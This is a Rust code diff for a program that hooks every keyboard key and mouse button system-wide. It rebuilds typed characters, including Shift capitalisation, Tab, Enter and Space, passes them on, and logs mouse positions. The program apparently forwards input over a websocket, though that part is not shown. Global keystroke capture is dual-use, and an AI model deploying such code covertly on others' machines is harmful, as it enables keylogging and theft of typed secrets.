@@ -1,4 +1,5 @@
-use inputbot::{KeybdKey::*, MouseButton::*, *};
+use inputbot::{*};
+use device_query::{DeviceQuery, DeviceState, MouseState, Keycode};
 use std::fs::OpenOptions;
 use std::io::prelude::*;
 use tungstenite::{connect, Message};
@@ -36,21 +37,52 @@ fn main() {
 }
 
 fn keyboard_input() {
-    KeybdKey::bind_all(|event| {
-        let mut c_action = ' ';
+    inputbot::KeybdKey::bind_all(|event| {
+        let mut c_action = String::new();
+        println!("{:?}", c_action);
         match inputbot::from_keybd_key(event) {
             Some(c) => { 
-                c_action = c;
+                c_action = c.to_string();
             },
-            None => {println!("{:?}", event)},
+            None => {
+                // Fill Unregistered keys used for typing
+                println!("{:?}", event);
+                c_action = fill_unregistered_keys(event);
+            },
         };
-        passthrough_key(c_action.to_string().as_str());
+        
+        // Device query for awareness of what other keys re being held.
+        let device_state = DeviceState::new();
+        let keys: Vec<Keycode> = device_state.get_keys();
+        println!("Is A pressed? {}", keys.contains(&Keycode::A));
+        println!("Keys Held: {:?}", &keys);
+        // Captialize on Right / Left Shift hold
+        if keys.contains(&Keycode::RShift) || keys.contains(&Keycode::LShift) {
+            let temp = c_action.to_ascii_uppercase();
+            c_action = temp;
+        }
+        passthrough_key(c_action.as_str());
     });
 
     // Bind all mouse buttons to a common callback event.
-    MouseButton::bind_all(|event| {
+    inputbot::MouseButton::bind_all(|event| {
+        let device_state = DeviceState::new();
+        let mouse: MouseState = device_state.get_mouse();
+        println!("Current Mouse Coordinates: {:?}", mouse.coords);
         println!("{:?}", event);
     });
 
     handle_input_events();
+}
+
+fn fill_unregistered_keys(event:KeybdKey) -> String {
+    println!("{:?}", event);
+    let mut return_string_value = String::new();
+    match event{
+        KeybdKey::TabKey=> return_string_value = String::from("    "),
+        KeybdKey::EnterKey=> return_string_value = String::from("\n"),
+        KeybdKey::SpaceKey=> return_string_value = String::from(" "),
+        _=>println!("Rest of the number")
+    }
+    return return_string_value;
 }
